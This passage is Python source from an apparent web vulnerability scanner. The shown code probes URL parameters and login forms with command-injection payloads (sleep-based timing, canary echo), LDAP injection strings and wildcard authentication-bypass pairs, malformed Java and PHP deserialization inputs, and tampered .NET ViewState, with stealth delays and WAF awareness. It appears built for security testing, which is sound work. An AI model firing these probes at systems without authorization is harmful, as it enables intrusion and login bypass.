        href = tag.get("href") or tag.get("action") or ""
        if href:
            all_urls.append(href)

    waf_note = ""
    waf_vendor = _waf_results.get(domain)
    if waf_vendor:
        waf_note = f" [WAF: {waf_vendor} detected — result may be a WAF block]"

    for raw_url in all_urls:
        if domain in _cmdi_domains:
            break
        try:
            resolved = urljoin(page_url, raw_url)
            parsed   = urlparse(resolved)
            if is_third_party_cdn(parsed.netloc):
                continue
            if not parsed.query:
                continue
            if _SQLI_STATIC_RE.search(parsed.path):   # reuse same static-file filter
                continue
            base = parsed.scheme + "://" + parsed.netloc + parsed.path
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        # Baseline for diff check and context detection
        _bl = _get_endpoint_baseline(base, params)
        bl_status = _bl.status_code if _bl else None
        bl_body   = _bl.body if _bl else None

        for param, orig_val in params.items():
            if domain in _cmdi_domains:
                break
            test_key = (base, param)
            if test_key in _cmdi_tested:
                continue
            _cmdi_tested.add(test_key)

            # Context detection — prepend context-breaking payloads when applicable
            ctx = _detect_input_context(bl_body or "", orig_val)
            if ctx != "unknown":
                print(timestamp() + f" [Context] CMDi param={param} in {ctx} context"
                      f" — using context-specific payloads")
            extra_payloads = _CMDI_CTX_EXTRA.get(ctx, [])
            all_payloads   = extra_payloads + _CMDI_UNIX_PAYLOADS + _CMDI_WIN_PAYLOADS

            print(timestamp() + f" CMDi probe: {base} param={param}")

            for payload in all_payloads:
                if domain in _cmdi_domains:
                    break
                new_query = "&".join(
                    f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
                    for k, v in params.items()
                )
                test_url = base + "?" + new_query
                try:
                    stealth_delay(domain)
                    resp = _get_session().get(
                        test_url,
                        headers=create_request_header(),
                        timeout=10,
                        allow_redirects=True,
                    )
                    body = resp.text or ""
                    # Check for canary echo (Linux and Windows).
                    # _cmdi_canary_is_standalone rejects reflected URL params,
                    # HTML attribute reflections, and JSON URL string reflections.
                    # Diff guard: canary must be new (not already in baseline).
                    if (_cmdi_canary_is_standalone(body, _CMDI_CANARY)
                            and _CMDI_CANARY not in (bl_body or "")):
                        idx = body.find(_CMDI_CANARY)
                        snippet = body[max(0, idx - 30):idx + len(_CMDI_CANARY) + 60].strip()
                        _tu = test_url
                        _msv_verify(
                            "CRITICAL", "COMMAND INJECTION (CONFIRMED)", domain,
                            f"Parameter '{param}' on {base} echoed canary string with "
                            f"payload: {payload!r} | Snippet: {snippet!r}{waf_note}",
                            lambda _u=_tu: _get_session().get(
                                _u, headers=create_request_header(),
                                timeout=10, allow_redirects=True,
                            ),
                            lambda r: _cmdi_canary_is_standalone(r.text or "", _CMDI_CANARY),
                        )
                        _cmdi_domains.add(domain)
                        break
                    # Windows-specific indicators (no canary, but dir output seen)
                    if payload in _CMDI_WIN_PAYLOADS:
                        for win_str in _CMDI_WIN_INDICATORS:
                            if (win_str in body and win_str != _CMDI_CANARY
                                    and win_str not in (bl_body or "")):
                                snippet = body[max(0, body.find(win_str) - 30):
                                               body.find(win_str) + 120].strip()
                                _tu = test_url
                                _ws = win_str
                                _msv_verify(
                                    "CRITICAL", "COMMAND INJECTION (WINDOWS INDICATOR)", domain,
                                    f"Parameter '{param}' on {base} returned Windows shell output "
                                    f"'{win_str}' with payload: {payload!r} | Snippet: {snippet!r}{waf_note}",
                                    lambda _u=_tu: _get_session().get(
                                        _u, headers=create_request_header(),
                                        timeout=10, allow_redirects=True,
                                    ),
                                    lambda r, _w=_ws: _w in (r.text or "") and _w != _CMDI_CANARY,
                                )
                                _cmdi_domains.add(domain)
                                break
                except Exception:
                    pass

            if domain in _cmdi_domains:
                continue

            # ── CMDi Phase 2: blind timing ────────────────────────────────────
            # Only run when canary-based Phase 1 found nothing.
            # Uses `; sleep {N}` / `| sleep {N}` / `$(sleep {N})` variants.
            _CMDI_SLEEP_TEMPLATES = [
                "; sleep {N}",
                "| sleep {N}",
                "$(sleep {N})",
                "`sleep {N}`",
            ]
            _PROBE_DELAYS_CMDI = [2, 4, 6]

            tp = _get_timing_profile(base, params)
            if not tp.valid:
                continue

            _confirmed_cmdi = 0
            _cmdi_probe_log: list[str] = []
            _cmdi_winning_payload: str | None = None
            _cmdi_winning_elapsed: float = 0.0

            for sleep_tmpl in _CMDI_SLEEP_TEMPLATES:
                if _confirmed_cmdi >= 2 or domain in _cmdi_domains:
                    break
                _confirmed_cmdi = 0
                _cmdi_probe_log = []

                for delay_s in _PROBE_DELAYS_CMDI:
                    if domain in _cmdi_domains:
                        break
                    payload = sleep_tmpl.replace("{N}", str(delay_s))
                    new_query = "&".join(
                        f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
                        for k, v in params.items()
                    )
                    test_url = base + "?" + new_query
                    threshold_ms = _timing_threshold(tp, delay_s)

                    try:
                        stealth_delay(domain)
                        t0 = time.monotonic()
                        _get_session().get(
                            test_url,
                            headers=create_request_header(),
                            timeout=max(delay_s + 10, 20),
                            allow_redirects=True,
                        )
                        elapsed_ms = (time.monotonic() - t0) * 1000.0
                    except Exception:
                        elapsed_ms = 0.0

                    hit = elapsed_ms >= threshold_ms
                    _cmdi_probe_log.append(
                        f"Probe(sleep {delay_s}): {elapsed_ms:.0f}ms "
                        f"(threshold {threshold_ms:.0f}ms) {'✓' if hit else '✗'}"
                    )
                    if hit:
                        _confirmed_cmdi += 1
                        if _cmdi_winning_payload is None:
                            _cmdi_winning_payload = payload
                            _cmdi_winning_elapsed = elapsed_ms
                    else:
                        break   # proportional scaling: stop if miss

                if _confirmed_cmdi >= 1:
                    break

            cmdi_timing_log = (
                f"Baseline: {tp.mean_ms:.0f}ms ±{tp.std_ms:.0f}ms | "
                + " | ".join(_cmdi_probe_log)
                + (" → CONFIRMED" if _confirmed_cmdi >= 2 else
                   " → WEAK" if _confirmed_cmdi == 1 else " → NOT TRIGGERED")
            )
            if _confirmed_cmdi >= 1:
                print(timestamp() + f" [Timing] CMDi {cmdi_timing_log}")

            if _confirmed_cmdi >= 1 and _cmdi_winning_payload:
                sev = "HIGH" if _confirmed_cmdi >= 2 else "MEDIUM"

                _tu = base + "?" + "&".join(
                    f"{k}={orig_val + _cmdi_winning_payload}" if k == param else f"{k}={v}"
                    for k, v in params.items()
                )
                _tp_ref = tp
                _wd = _PROBE_DELAYS_CMDI[0]
                _timing = [0.0]

                def _re_time_cmdi(_u=_tu, _t=_timing, _tp=_tp_ref, _d=_wd):
                    _t0 = time.monotonic()
                    r   = _get_session().get(_u, headers=create_request_header(),
                                             timeout=max(_d + 10, 20), allow_redirects=True)
                    _t[0] = (time.monotonic() - _t0) * 1000.0
                    return r

                _msv_verify(
                    sev, "COMMAND INJECTION (TIME-BASED BLIND)", domain,
                    f"Parameter '{param}' on {base} | {cmdi_timing_log} | "
                    f"Winning payload: {_cmdi_winning_payload!r}{waf_note}",
                    _re_time_cmdi,
                    lambda r, _t=_timing, _tp=_tp_ref, _d=_wd:
                        _t[0] >= _timing_threshold(_tp, _d),
                )
                if sev == "HIGH":
                    _cmdi_domains.add(domain)


# ─────────────────────────────────────────────
# LDAP Injection detection
# ─────────────────────────────────────────────

# Error strings that confirm server-side LDAP processing
_LDAP_ERROR_STRINGS = [
    "LDAP error",
    "LDAPException",
    "javax.naming",
    "com.sun.jndi",
    "Invalid DN",
    "supplied argument is not a valid ldap",
    "Bad search filter",
    "ldap_search",
    "LdapErr",
    "DSA is unwilling to perform",
    "No Such Object",
]

# Metacharacter payloads that trigger LDAP errors on unparameterised queries
_LDAP_ERROR_PAYLOADS = [
    "*",
    ")(uid=*",
    "*(uid=*)",
    "*(|(uid=*))",
    "*)(objectClass=*",
    ")(objectClass=*",
    "*(objectClass=*)",
    "\\2a",
    "\\28",
    "\\29",
]

# Classic LDAP auth bypass pairs (username_payload, password_payload)
_LDAP_BYPASS_PAIRS = [
    ("*",          "*"),
    ("admin)(&)",  "anything"),
    ("*)(&",       "anything"),
    ("*)(uid=*",   "anything"),
]

# Body phrases consistent with a successful login
_LDAP_SUCCESS_BODY = frozenset({
    "welcome", "logged in", "log out", "logout", "sign out", "signout",
    "dashboard", "my account", "your account", "profile", "portal",
    "you are now logged", "successfully authenticated",
})

# URL path segments that suggest a post-login landing page
_LDAP_SUCCESS_PATHS = frozenset({
    "dashboard", "admin", "home", "welcome", "profile", "account",
    "portal", "main", "index", "overview", "panel",
})

# Input name/id values that identify a username field
_LDAP_USER_NAMES = frozenset({
    "user", "username", "login", "email", "mail", "uid", "name",
    "account", "userid", "user_name", "user_email",
    "loginname", "login_name", "uname",
})

# Input name/id values that identify a password field
_LDAP_PASS_NAMES = frozenset({
    "pass", "password", "passwd", "pwd", "secret",
    "pass1", "password1", "userpass", "user_pass",
})

_ldapi_tested: set      = set()   # (base_url, param) URL-param pairs already probed
_ldapi_form_tested: set = set()   # form action URLs already tested for auth bypass


def _is_login_form(form) -> bool:
    """Return True if the BeautifulSoup <form> element looks like an auth form."""
    inputs     = form.find_all("input")
    has_pass   = any(i.get("type", "").lower() == "password" for i in inputs)
    has_user   = any(
        i.get("name", "").lower() in _LDAP_USER_NAMES
        or i.get("id",   "").lower() in _LDAP_USER_NAMES
        for i in inputs
    )
    return has_pass and has_user


def _ldap_login_success(resp, baseline_cookies: dict) -> bool:
    """
    Return True if *resp* looks like a successful login.

    Three independent signals (any one is sufficient):
      1. Final URL path contains a known post-login segment.
      2. A new auth-related cookie appeared that was not in the baseline.
      3. Response body contains a success phrase.
    """
    if resp is None:
        return False

    # Signal 1 — redirect to a success path
    final_path = urlparse(resp.url).path.lower()
    if any(seg in final_path for seg in _LDAP_SUCCESS_PATHS):
        return True

    # Signal 2 — new cookie with an auth-related name
    new_cookies = set(resp.cookies) - set(baseline_cookies)
    if new_cookies:
        _AUTH_COOKIE_NAMES = {"session", "token", "auth", "jwt", "access", "user", "uid"}
        if any(any(n in c.lower() for n in _AUTH_COOKIE_NAMES) for c in new_cookies):
            return True

    # Signal 3 — success phrase in body
    body_lower = (resp.text or "").lower()
    if any(phrase in body_lower for phrase in _LDAP_SUCCESS_BODY):
        return True

    return False


def check_ldap_injection(page_url: str, html_content) -> None:
    """
    LDAP injection and authentication bypass detection.

    Phase 1 — error-based parameter injection:
      Appends LDAP metacharacter payloads to every URL query parameter
      found on the page (links + form actions). Flags CRITICAL when a
      known LDAP error string is reflected in the response.

    Phase 2 — login form authentication bypass:
      Identifies POST forms that contain both a user and password field.
      Sends a baseline request with garbage credentials, then retries with
      classic LDAP wildcard bypass payloads. Flags HIGH when the bypass
      response contains a success signal that the baseline did not.

    Only called when --active-probes is enabled.
    Safe-mode only: no directory enumeration, no credential extraction,
    no directory modifications.
    8-second timeout per probe. Deduplicates per (base_url, param)
    and per form action URL.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    waf_note = ""
    waf_vendor = _waf_results.get(domain)
    if waf_vendor:
        waf_note = f" [WAF: {waf_vendor} detected — result may be a WAF block, not real injection]"

    # ── Phase 1: URL parameter error-based injection ──────────────────────────
    all_urls = [page_url]
    for tag in soup.find_all(["a", "form"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            all_urls.append(href)

    for raw_url in all_urls:
        try:
            resolved = urljoin(page_url, raw_url)
            parsed   = urlparse(resolved)
            if is_third_party_cdn(parsed.netloc):
                continue
            if not parsed.query:
                continue
            if _SQLI_STATIC_RE.search(parsed.path):   # reuse static-file filter
                continue
            base = parsed.scheme + "://" + parsed.netloc + parsed.path
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        # Baseline for anomaly gating (collect once per URL before param loop)
        _ldap_bl = _get_endpoint_baseline(base, params)

        for param, orig_val in params.items():
            test_key = (base, param)
            if test_key in _ldapi_tested:
                continue
            _ldapi_tested.add(test_key)

            print(timestamp() + f" LDAPi probe: {base} param={param}")

            for payload in _LDAP_ERROR_PAYLOADS:
                new_query = "&".join(
                    f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
                    for k, v in params.items()
                )
                test_url = base + "?" + new_query
                try:
                    stealth_delay(domain)
                    resp = _get_session().get(
                        test_url,
                        headers=create_request_header(),
                        timeout=8,
                        allow_redirects=True,
                    )
                    body = resp.text or ""
                    _ldap_anom, _ = _is_probe_anomalous(
                        _ldap_bl, body, resp.status_code
                    )
                    if _ldap_bl is not None and not _ldap_anom:
                        continue   # baseline-identical response — not a real injection
                    for err_str in _LDAP_ERROR_STRINGS:
                        if err_str.lower() in body.lower():
                            # Suppress if error was already present in baseline
                            if _ldap_bl is not None and err_str.lower() in (_ldap_bl.body or "").lower():
                                continue
                            idx     = body.lower().find(err_str.lower())
                            snippet = body[max(0, idx - 40):idx + 120].strip()
                            _tu = test_url
                            _es = err_str
                            _msv_verify(
                                "CRITICAL", "LDAP INJECTION (ERROR-BASED)", domain,
                                f"Parameter '{param}' on {base} reflects LDAP error "
                                f"'{err_str}' with payload: {payload!r} | "
                                f"Snippet: {snippet!r}{waf_note}",
                                lambda _u=_tu: _get_session().get(
                                    _u, headers=create_request_header(),
                                    timeout=8, allow_redirects=True,
                                ),
                                lambda r, _e=_es: _e.lower() in (r.text or "").lower(),
                            )
                            break   # one alert per parameter is enough
                except Exception:
                    pass

    # ── Phase 2: Login form authentication bypass ─────────────────────────────
    for form in soup.find_all("form"):
        if not _is_login_form(form):
            continue
        if form.get("method", "get").upper() != "POST":
            continue

        action     = form.get("action") or page_url
        action_url = urljoin(page_url, action)
        if is_third_party_cdn(urlparse(action_url).netloc):
            continue
        if action_url in _ldapi_form_tested:
            continue
        _ldapi_form_tested.add(action_url)

        # Resolve username and password field names from the form DOM
        field_defaults: dict = {}
        user_field = pass_field = None
        for inp in form.find_all(["input", "select", "textarea"]):
            name = inp.get("name", "")
            if not name:
                continue
            field_defaults[name] = inp.get("value", "")
            itype = inp.get("type", "").lower()
            if itype == "password":
                pass_field = name
            elif (name.lower() in _LDAP_USER_NAMES
                  or inp.get("id", "").lower() in _LDAP_USER_NAMES):
                user_field = name

        if not user_field or not pass_field:
            continue   # cannot identify credential fields; skip

        print(timestamp() + f" LDAP auth bypass probe: {action_url}"
              + f" [{user_field}={pass_field}]")

        # Baseline with obviously invalid credentials
        baseline_data = {
            **field_defaults,
            user_field: "ldap-probe-user",
            pass_field: "ldap-probe-pass",
        }
        try:
            stealth_delay(domain)
            baseline_resp    = _get_session().post(
                action_url,
                data=baseline_data,
                headers=create_request_header(),
                timeout=8,
                allow_redirects=True,
            )
            baseline_cookies = dict(baseline_resp.cookies)
        except Exception:
            continue   # cannot establish baseline; skip this form

        # Try each bypass payload pair
        for user_payload, pass_payload in _LDAP_BYPASS_PAIRS:
            bypass_data = {
                **field_defaults,
                user_field: user_payload,
                pass_field: pass_payload,
            }
            try:
                stealth_delay(domain)
                bypass_resp = _get_session().post(
                    action_url,
                    data=bypass_data,
                    headers=create_request_header(),
                    timeout=8,
                    allow_redirects=True,
                )
                if _ldap_login_success(bypass_resp, baseline_cookies):
                    body_snip = (bypass_resp.text or "")[:300].strip()
                    _au = action_url
                    _bd = dict(bypass_data)
                    _bc = dict(baseline_cookies)
                    _msv_verify(
                        "HIGH", "LDAP AUTHENTICATION BYPASS", domain,
                        f"Login form at {action_url} accepted LDAP wildcard bypass — "
                        f"{user_field}={user_payload!r}, {pass_field}={pass_payload!r} | "
                        f"Final URL: {bypass_resp.url} | "
                        f"Snippet: {body_snip!r}{waf_note}",
                        lambda _u=_au, _d=_bd: _get_session().post(
                            _u, data=_d,
                            headers=create_request_header(),
                            timeout=8, allow_redirects=True,
                        ),
                        lambda r, _b=_bc: _ldap_login_success(r, _b),
                    )
                    break   # one alert per form
            except Exception:
                pass


# ─────────────────────────────────────────────
# Insecure Deserialization Detection
# ─────────────────────────────────────────────

# ── Passive indicator constants ─────────────────────────────────────────────

_JAVA_SERIAL_MAGIC      = b"\xac\xed\x00\x05"
_JAVA_SERIAL_B64_PREFIX = "rO0AB"          # base64 encoding of AC ED 00 05

# PHP serialized object/array/string/bool/int/null prefix patterns
_PHP_SERIAL_RE = re.compile(
    r"(?:^|[\s\n;{,])(?:O:\d+:\"|a:\d+:\{|s:\d+:\"|b:[01];|i:\d+;|N;)",
    re.MULTILINE,
)

# Python pickle protocol 2–5 magic bytes
_PICKLE_MAGICS = (b"\x80\x02", b"\x80\x03", b"\x80\x04", b"\x80\x05")

_RUBY_MARSHAL_MAGIC = b"\x04\x08"

# Matches both attribute-order variants of a __VIEWSTATE hidden input
_VIEWSTATE_RE = re.compile(
    r'<input[^>]+name=["\']__VIEWSTATE["\'][^>]*value=["\']([^"\']{4,})["\']'
    r'|<input[^>]+value=["\']([^"\']{4,})["\'][^>]*name=["\']__VIEWSTATE["\']',
    re.IGNORECASE | re.DOTALL,
)
_VIEWSTATE_B64_RE = re.compile(r'^[A-Za-z0-9+/=]+$')

# ── Active probe error strings ──────────────────────────────────────────────

_JAVA_DESERIAL_ERRORS = [
    "java.io.InvalidClassException",
    "java.lang.ClassNotFoundException",
    "ObjectInputStream",
    "ClassCastException",
    "java.io.StreamCorruptedException",
]
_PHP_DESERIAL_ERRORS = [
    "unserialize(): Error",
    "Cannot unserialize",
    "__wakeup",
    "__destruct",
    "unserialize() expects parameter",
]

# ── Dedup sets ──────────────────────────────────────────────────────────────

_deserial_passive_seen: set  = set()   # (page_url, format_label)
_deserial_active_tested: set = set()   # (endpoint, format_label)


# ── Helpers ─────────────────────────────────────────────────────────────────

def _to_bytes(content) -> bytes:
    """Return content as bytes regardless of input type."""
    if isinstance(content, bytes):
        return content
    if isinstance(content, str):
        return content.encode("utf-8", errors="replace")
    return b""


def scan_deserial_passive(
    page_url: str,
    html_content,
    response_headers: dict,
) -> None:
    """
    Passive serialization format detection. Runs unconditionally on every crawled
    response — does NOT require --active-probes. Flags MEDIUM (or INFO for ViewState
    presence alone) when a known serialized-data indicator is found in the response
    body, Content-Type header, or Set-Cookie header.

    Java:   AC ED 00 05 magic bytes | 'rO0AB' Base64 prefix | Content-Type header
    PHP:    O:\\d+: / a:\\d+: / s:\\d+: patterns in body or Set-Cookie
    Pickle: 80 02–05 magic bytes | Content-Type header
    Ruby:   04 08 magic bytes
    .NET:   __VIEWSTATE hidden field present (INFO — active check may upgrade)
    """
    if not is_in_scope(page_url):
        return
    if is_third_party_cdn(urlparse(page_url).netloc):
        return

    hdrs       = {k.lower(): v for k, v in response_headers.items()} if response_headers else {}
    ct         = hdrs.get("content-type", "")
    set_cookie = hdrs.get("set-cookie", "")
    body_b     = _to_bytes(html_content)
    body_s     = body_b.decode("utf-8", errors="replace")

    findings = []   # (format_label, evidence_str, severity)

    # ── Java serialization ────────────────────────────────────────────────────
    if "application/x-java-serialized-object" in ct.lower():
        findings.append(("Java serialization",
                          "Content-Type: application/x-java-serialized-object", "MEDIUM"))
    elif body_b[:4] == _JAVA_SERIAL_MAGIC:
        findings.append(("Java serialization",
                          "Response body starts with Java magic bytes AC ED 00 05", "MEDIUM"))
    elif _JAVA_SERIAL_B64_PREFIX in body_s or _JAVA_SERIAL_B64_PREFIX in set_cookie:
        where = "Set-Cookie" if _JAVA_SERIAL_B64_PREFIX in set_cookie else "response body"
        findings.append(("Java serialization",
                          f"Base64 Java serialization prefix 'rO0AB' in {where}", "MEDIUM"))

    # ── PHP serialization ─────────────────────────────────────────────────────
    for src_label, src_text in (("response body", body_s), ("Set-Cookie", set_cookie)):
        m = _PHP_SERIAL_RE.search(src_text)
        if m:
            snippet = src_text[max(0, m.start() - 10):m.end() + 60].strip()
            findings.append(("PHP serialization",
                              f"PHP serialized data pattern in {src_label}: {snippet!r}", "MEDIUM"))
            break

    # ── Python pickle ─────────────────────────────────────────────────────────
    if "application/python-pickle" in ct.lower():
        findings.append(("Python pickle", "Content-Type: application/python-pickle", "MEDIUM"))
    elif any(body_b.startswith(m) for m in _PICKLE_MAGICS):
        findings.append(("Python pickle",
                          f"Response body starts with pickle magic {body_b[:2].hex().upper()}", "MEDIUM"))

    # ── Ruby Marshal ──────────────────────────────────────────────────────────
    if body_b[:2] == _RUBY_MARSHAL_MAGIC:
        findings.append(("Ruby Marshal",
                          "Response body starts with Ruby Marshal magic bytes 04 08", "MEDIUM"))

    # ── .NET ViewState presence ───────────────────────────────────────────────
    vm = _VIEWSTATE_RE.search(body_s)
    if vm:
        vs_val = (vm.group(1) or vm.group(2) or "")[:40]
        findings.append(("NET ViewState",
                          f"__VIEWSTATE hidden field present (prefix: {vs_val!r}…)", "INFO"))

    for fmt_label, evidence, sev in findings:
        key = (page_url, fmt_label)
        if key in _deserial_passive_seen:
            continue
        _deserial_passive_seen.add(key)
        alert(
            f"SERIALIZED DATA FORMAT DETECTED: {fmt_label}",
            sev,
            page_url,
            f"{fmt_label} serialized data format detected — endpoint may accept/return "
            f"serialized objects. Evidence: {evidence}. "
            f"Manual verification required to confirm exploitability.",
        )
        print(timestamp() + f" [!] Serialized format ({fmt_label}) detected at {page_url}")


def check_insecure_deserialization(
    page_url: str,
    html_content,
    response_headers: dict,
) -> None:
    """
    Active insecure deserialization detection. Requires --active-probes.

    Java:
      POST a malformed serialization stream (magic header + truncated class
      descriptor) to the endpoint. Triggers StreamCorruptedException or
      InvalidClassException — confirms deserialization without loading any class.

    PHP:
      POST a syntactically incomplete PHP serialized string to the page. Checks
      for PHP unserialize() warning/error strings in the response.

    .NET ViewState MAC:
      For each form containing __VIEWSTATE, flip one character, resubmit via POST
      to the form action. If the server accepts the tampered ViewState without a
      MAC validation error → MAC protection is disabled → HIGH.

    Detection-only: no gadget chains, no class loading, no code execution.
    10-second timeout per probe. Deduplicates per (endpoint, format) pair.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    body_b = _to_bytes(html_content)
    body_s = body_b.decode("utf-8", errors="replace")
    hdrs   = {k.lower(): v for k, v in response_headers.items()} if response_headers else {}
    ct     = hdrs.get("content-type", "")
    sc     = hdrs.get("set-cookie", "")

    waf_note = ""
    waf_vendor = _waf_results.get(domain)
    if waf_vendor:
        waf_note = f" [WAF: {waf_vendor} detected]"

    # ── Java active probe ─────────────────────────────────────────────────────
    is_java = (
        "application/x-java-serialized-object" in ct.lower()
        or body_b[:4] == _JAVA_SERIAL_MAGIC
        or _JAVA_SERIAL_B64_PREFIX in body_s
        or _JAVA_SERIAL_B64_PREFIX in sc
    )
    if is_java:
        akey = (page_url, "Java")
        if akey not in _deserial_active_tested:
            _deserial_active_tested.add(akey)
            # Malformed stream: magic + class-descriptor start for non-existent class.
            # StreamCorruptedException fires before any class is resolved — safe.
            java_probe = (
                _JAVA_SERIAL_MAGIC
                + b"\x73\x72\x00\x09ProbeTest"   # TC_OBJECT TC_CLASSDESC len=9 "ProbeTest"
                + b"\x00" * 8                    # serialVersionUID placeholder
                + b"\x02\x00\x00"                # flags + field count = 0
            )
            try:
                stealth_delay(domain)
                print(timestamp() + f" Java deserial active probe: {page_url}")
                resp = _get_session().post(
                    page_url,
                    data=java_probe,
                    headers={**create_request_header(),
                              "Content-Type": "application/x-java-serialized-object"},
                    timeout=10,
                    allow_redirects=True,
                    verify=False,
                )
                body = resp.text or ""
                for err in _JAVA_DESERIAL_ERRORS:
                    if err in body:
                        idx     = body.find(err)
                        snippet = body[max(0, idx - 30):idx + 120].strip()
                        alert(
                            "INSECURE DESERIALIZATION: Java (CONFIRMED)",
                            "HIGH",
                            page_url,
                            f"Endpoint processed Java serialized input and reflected error "
                            f"'{err}' — confirms server-side Java ObjectInputStream usage. "
                            f"Snippet: {snippet!r}{waf_note}",
                        )
                        break
            except Exception:
                pass

    # ── PHP active probe ──────────────────────────────────────────────────────
    is_php = bool(_PHP_SERIAL_RE.search(body_s) or _PHP_SERIAL_RE.search(sc))
    if is_php:
        akey = (page_url, "PHP")
        if akey not in _deserial_active_tested:
            _deserial_active_tested.add(akey)
            # Intentionally malformed — truncated object body triggers unserialize() error
            php_probe = 'O:9:"ProbeTest":1:{'
            try:
                stealth_delay(domain)
                print(timestamp() + f" PHP deserial active probe: {page_url}")
                resp = _get_session().post(
                    page_url,
                    data={"data": php_probe},
                    headers=create_request_header(),
                    timeout=10,
                    allow_redirects=True,
                )
                body = resp.text or ""
                for err in _PHP_DESERIAL_ERRORS:
                    if err.lower() in body.lower():
                        idx     = body.lower().find(err.lower())
                        snippet = body[max(0, idx - 30):idx + 120].strip()
                        alert(
                            "INSECURE DESERIALIZATION: PHP (CONFIRMED)",
                            "HIGH",
                            page_url,
                            f"Endpoint reflected PHP unserialize error '{err}' — "
                            f"confirms server-side unserialize() call on user input. "
                            f"Snippet: {snippet!r}{waf_note}",
                        )
                        break
            except Exception:
                pass

    # ── .NET ViewState MAC validation check ───────────────────────────────────
    try:
        soup = BeautifulSoup(body_s, "lxml")
    except Exception:
        soup = None

    if soup:
        for form in soup.find_all("form"):
            vs_input = form.find("input", attrs={"name": "__VIEWSTATE"})
            if vs_input is None:
                continue
            vs_val = vs_input.get("value", "")
            if not vs_val or not _VIEWSTATE_B64_RE.match(vs_val):
                continue

            action     = form.get("action") or page_url
            action_url = urljoin(page_url, action)
            akey       = (action_url, "ViewState")
            if akey in _deserial_active_tested:
                continue
            _deserial_active_tested.add(akey)

            # Tamper: flip last Base64 character (preserves length, breaks MAC)
            modified_vs = vs_val[:-1] + ("A" if vs_val[-1] != "A" else "B")

            # Build a minimal form submission with all hidden fields + tampered ViewState
            form_data = {"__VIEWSTATE": modified_vs}
            for inp in form.find_all("input"):
                n = inp.get("name", "")
                if n and n != "__VIEWSTATE":
                    form_data[n] = inp.get("value", "")

            try:
                stealth_delay(domain)
                print(timestamp() + f" ViewState MAC probe: {action_url}")
                resp = _get_session().post(
                    action_url,
                    data=form_data,
                    headers=create_request_header(),
                    timeout=10,
                    allow_redirects=True,
                )
                body = resp.text or ""
                mac_error_sigs = [
                    "invalid viewstate",
                    "validation of viewstate mac",
                    "the state information is invalid",
                    "mac failed",
                    "viewstate",
                ]
                rejected = any(sig in body.lower() for sig in mac_error_sigs)
                if not rejected and resp.status_code == 200:
                    alert(
                        "INSECURE DESERIALIZATION: .NET ViewState MAC Disabled",
                        "HIGH",
                        action_url,
                        f"Tampered __VIEWSTATE accepted without MAC validation error — "
                        f"ViewState MAC protection appears disabled. "
                        f"Original prefix: {vs_val[:20]!r}… "
                        f"Tampered prefix: {modified_vs[:20]!r}…{waf_note}",
                    )
                else:
                    print(timestamp() + f" ViewState MAC validation active on {action_url}")
            except Exception:
                pass


# ─────────────────────────────────────────────
# Price manipulation detection
# ─────────────────────────────────────────────

# URL path keywords that indicate a checkout/payment endpoint
_PRICE_URL_RE = re.compile(
    r'/(?:checkout|cart|order|payment|purchase|buy|basket|booking|ticket)',
    re.IGNORECASE,
)

# JSON field names that carry monetary or quantity values
_PRICE_FIELDS = frozenset({
    "price", "amount", "total", "cost", "fee", "charge",
    "quantity", "qty",
})

# Patterns in a response body that suggest an order/booking was accepted
_PRICE_SUCCESS_RE = re.compile(
    r'(?:order|booking|reservation|transaction|payment|purchase)'
    r'[^.]{0,60}'
    r'(?:confirmed|created|accepted|success|placed|complete)',
    re.IGNORECASE,
)

# Patterns that indicate the server rejected the request safely
_PRICE_REJECT_RE = re.compile(
    r'invalid.{0,30}(?:price|amount|quantity|value)'
    r'|(?:price|amount|quantity).{0,30}(?:must be|cannot be|invalid|positive)'
    r'|bad.{0,30}request'
    r'|validation.{0,30}(?:error|fail)'
    r'|(?:negative|zero).{0,30}(?:price|amount|quantity).{0,30}not.{0,30}allow',
    re.IGNORECASE,
)

_price_tested: set = set()   # endpoints already probed


def _price_extract_numeric(val):
    """
    Return the float representation of *val* if it is a JSON number or a
    string encoding a number (e.g. "9.99", "1000").  Returns None otherwise.
    """
    if isinstance(val, (int, float)):
        return float(val)
    if isinstance(val, str):
        try:
            return float(val.replace(",", "").strip())
        except ValueError:
            pass
    return None


def _price_find_fields(obj, path=""):
    """
    Recursively walk a decoded JSON object and yield (dot-path, value) for
    every leaf whose key is a price/quantity field name.
    """
    if isinstance(obj, dict):
        for k, v in obj.items():
            full = f"{path}.{k}" if path else k
            if k.lower() in _PRICE_FIELDS:
                yield full, v
            else:
                yield from _price_find_fields(v, full)
    elif isinstance(obj, list):
        for i, item in enumerate(obj):
            yield from _price_find_fields(item, f"{path}[{i}]")


def _price_set_nested(obj, dot_path, new_val):
    """
    Return a deep copy of *obj* with the value at *dot_path* replaced by
    *new_val*.  Handles both dict keys and list indices (bracket notation).
    """
    import copy
    result = copy.deepcopy(obj)
    parts  = re.split(r'\.|\[(\d+)\]', dot_path)
    node   = result
    # Walk to the parent of the target node
    keys = []
    for raw in dot_path.replace("]", "").replace("[", ".").split("."):
        if raw == "":
            continue
        try:
            keys.append(int(raw))
        except ValueError:
            keys.append(raw)
    for k in keys[:-1]:
        node = node[k]
    node[keys[-1]] = new_val
    return result


def _price_response_signals(resp, orig_body: dict, field_path: str, probe_val):
    """
    Examine *resp* and return (severity, evidence_str) if the manipulation
    appears to have been processed, or (None, None) if the server rejected it
    safely or the result is ambiguous.

    severity is "HIGH" or "MEDIUM".
    """
    if resp is None:
        return None, None

    body_text = resp.text or ""
    body_lower = body_text.lower()

    # Safe rejection — server explicitly complained about the value
    if _PRICE_REJECT_RE.search(body_text):
        return None, None

    # Try to parse a JSON response and look for numeric totals
    resp_json = None
    try:
        resp_json = resp.json()
    except Exception:
        pass

    if resp_json is not None:
        # Walk response JSON for total/amount/price fields
        for resp_path, resp_val in _price_find_fields(resp_json):
